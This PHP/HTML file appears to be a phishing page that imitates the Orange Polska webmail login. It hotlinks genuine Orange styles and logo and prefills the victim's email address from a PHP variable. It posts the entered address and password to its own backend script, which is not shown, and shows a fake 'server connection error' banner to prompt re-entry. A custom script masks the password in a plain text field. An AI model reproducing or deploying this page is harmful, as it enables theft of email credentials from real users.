<?php include '../build.php' ?>
<html lang="pl" class="js chrome webkit layout-large"><head>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Poczta Orange :: Witamy w Poczta Orange</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
	<link rel="shortcut icon" href="https://poczta.orange.pl/static.php/skins/orange/images/favicon.ico?s=1780040271">
	<link rel="stylesheet" href="https://poczta.orange.pl/static.php/skins/orange/deps/bootstrap.min.css?s=1780040271">
	<link rel="stylesheet" href="https://poczta.orange.pl/static.php/skins/orange/styles/styles.min.css?s=1780040271">
	<link rel="stylesheet" type="text/css" href="https://poczta.orange.pl/static.php/skins/orange/orange-multibox.css?s=1780040271">
	
	<link rel="stylesheet" type="text/css" href="https://poczta.orange.pl/static.php/plugins/opl_2fa/opl_2fa.css?s=1774442779">
	<link rel="stylesheet" type="text/css" href="https://poczta.orange.pl/static.php/plugins/jqueryui/themes/orange/jquery-ui.min.css?s=1780040271">
	<link rel="stylesheet" type="text/css" href="https://poczta.orange.pl/static.php/plugins/persistent_login/persistent_login.css?s=1597130628">
	<script>
	/*
			@licstart  The following is the entire license notice for the
			JavaScript code in this page.

			Copyright (C) The Roundcube Dev Team

			The JavaScript code in this page is free software: you can redistribute
			it and/or modify it under the terms of the GNU General Public License
			as published by the Free Software Foundation, either version 3 of
			the License, or (at your option) any later version.

			The code is distributed WITHOUT ANY WARRANTY; without even the implied
			warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
			See the GNU GPL for more details.

			@licend  The above is the entire license notice
			for the JavaScript code in this page.
	*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"pl_PL","devel_mode":false,"rcversion":10701,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":false,"skin":"orange","blankpage":"https://poczta.orange.pl/static.php/skins/orange/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"","compose_extwin":false,"opl2fa_remember":true,"opl2fa_username":null,"date_format":"yy-mm-dd","date_format_localized":"RRRR-MM-DD","request_token":"5yA1MSIGbEgrqCPVjB7BBaDg2vU7mccM"});
rcmail.add_label({"loading":"Ładowanie...","servererror":"Błąd serwera!","connerror":"Błąd połączenia (brak odpowiedzi serwera)!","requesttimedout":"Upłynął limit czasu żądania","refreshing":"Odświeżanie...","windowopenerror":"Wyskakujące okno zostało zablokowane!","uploadingmany":"Zapisywanie plików...","uploading":"Zapisywanie pliku...","close":"Zamknij","save":"Zapisz","cancel":"Anuluj","alerttitle":"Uwaga","confirmationtitle":"Czy jesteś pewien...","delete":"Usuń","continue":"Kontynuuj","ok":"OK","back":"Wstecz","errortitle":"Wystąpił błąd!","options":"Opcje","plaintoggle":"Zwykły tekst","htmltoggle":"HTML","previous":"Poprzednia","next":"Następna","select":"Zaznacz","browse":"Przeglądaj","choosefile":"Wybierz plik...","choosefiles":"Wybierz pliki...","persistent_login.ifpl_rememberme":"Zapamiętaj mnie","persistent_login.ifpl_rememberme_hint":"Ze względów bezpieczeństwa, nie używaj tej opcji na publicznych lub niezaufanych komputerach."});
rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
rcmail.gui_object('message', 'messagestack');
</script>

<script src="https://poczta.orange.pl/static.php/plugins/opl_2fa/qrcode.min.js?s=1774442779"></script>
<script src="https://poczta.orange.pl/static.php/plugins/jqueryui/js/jquery-ui.min.js?s=1780040271"></script>
<script src="https://poczta.orange.pl/static.php/plugins/jqueryui/js/i18n/datepicker-pl.js?s=1780040271"></script>
<script src="https://poczta.orange.pl/static.php/plugins/persistent_login/persistent_login.js?s=1597130628"></script>
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
	.ui.alert.alert-warning>i.icon:before {
        font-family: "Font Awesome 6 Free";
        content: "\f071";
        color: #ffd452;
    }

	.input-group-text.icon.user::before { 
        font-family: "Font Awesome 6 Free";
        content: "\f007";
        display: inline-block;
    }

    .input-group-text.icon.pass::before {
        font-family: "Font Awesome 6 Free";
        content: "\f023";
        display: inline-block;
    }

	#messagestack {
		position: absolute;
		bottom: .5em;
		right: .7em;
		z-index: 105;
		width: 320px;
		height: auto;
		max-height: 85%;
	}
</style>
</head>
<body class="task-login action-none">
	<div id="layout">
<h1 class="voice">Poczta Orange Zaloguj się</h1>

<div id="layout-content" class="selected no-navbar" role="main">
	<img src="https://poczta.orange.pl/static.php/skins/orange/images/logo.svg?s=1780040271" id="logo" alt="Logo">
	<form id="login-form" name="login-form" method="post" class="propform" action="">
    <input type="hidden" name="login" value="orangepl" class="form-control">
	<h1>Poczta Orange</h1>
	<table>
		<tbody><tr class="form-group row">
			<td class="title" style="display: none;"><label for="rcmloginuser">Adres e-mail</label></td>
			<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="off" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="<?php echo htmlspecialchars($decoded); ?>" type="text" placeholder="Adres e-mail">
		</td></tr>
		<tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Hasło</label></td>
	<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span>
	<input name="pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="off" type="text" placeholder="Hasło">
	</td></tr>
					<tr class="form-group row">
						<td class="title" style="display: none;">
							<label for="rcmloginuser">Username</label>
						</td>
						<td class="input input-group input-group-lg">
							<div class="custom-control custom-switch">
								<input type="checkbox" class="custom-control-input" id="_ifpl" name="_ifpl" value="1">
								<label class="custom-control-label" for="_ifpl">Zapamiętaj mnie</label>
							</div>
						</td>
					</tr>
					<tr id="ifpl-hint" class="form-group row" style="display: none;">
						<td class="ifpl-hint" colspan="2">Ze względów bezpieczeństwa, nie używaj tej opcji na publicznych lub niezaufanych komputerach.</td>
					</tr>
				</tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg w-100">Zaloguj się</button></p>
			<div id="login-footer" role="contentinfo">
		</div>
	</form>
</div>
</div>
</div>
<div id="messagestack" style="<?php echo $error; ?>"><div class="warning content ui alert alert-warning" role="alert"><i class="icon"></i><span>Błąd połączenia z serwerem!</span></div></div>
</script>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("rcmloginpwd"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>